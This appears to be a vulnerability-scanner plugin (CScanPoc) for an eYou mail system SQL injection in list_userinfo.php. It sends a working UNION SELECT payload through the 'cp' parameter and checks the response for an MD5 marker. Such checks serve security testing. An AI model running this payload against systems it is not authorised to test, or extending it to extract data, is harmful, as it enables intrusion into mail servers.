# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'eYou_0009'  # 平台漏洞编号，留空
    name = ' eYou 邮件系统中 /php/bill/list_userinfo.php 中 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-23'  # 漏洞公布时间
    desc = '''
        eYou 邮件系统中 /php/bill/list_userinfo.php 中的 cp 参数存在注入, 将导致敏感数据泄漏
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=058014'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'bc27a2d5-7506-42b3-a00f-feeabb1a8374'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1%20union%20select%20md5(3.14),2,3,4,5%23"
            code, head, res, errcode, finalurl = hh.http(
                "%s" % (arg + payload))

            if code == 200:
                if "63e1f04640e83605c1d177544a5a0488" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
